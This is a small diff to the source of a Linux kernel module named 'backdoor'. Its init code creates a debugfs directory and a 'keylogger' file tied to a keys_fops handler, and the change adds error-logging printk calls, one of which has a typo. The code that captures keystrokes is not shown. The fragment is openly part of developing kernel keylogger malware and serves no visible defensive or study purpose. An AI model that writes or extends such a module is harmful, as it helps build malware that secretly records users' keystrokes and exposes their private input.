@@ -25,13 +25,19 @@ static int __init backdoor_init(void){
 
     // SUBDIR CONFIGURATIONS
     subdir = debugfs_create_dir("backdoor", NULL);
-	if (IS_ERR(subdir))
+	if (IS_ERR(subdir)){
+		printk(KERN_INFO "[-] Error in create directory\n");
 		return PTR_ERR(subdir);
-	if (!subdir)
+	}
+	if (!subdir){
+		printk(KERN_INFO "[-] No such file or directory\n");
 		return -ENOENT;
+	}
 
+	// FILE CONFIGURATIONS
 	file = debugfs_create_file("keylogger", 0400, subdir, NULL, &keys_fops);
 	if (!file) {
+		printk(KERN_INFO "[-] Error in create file - the directory will me removed\n");
 		debugfs_remove_recursive(subdir);
 		return -ENOENT;
 	}
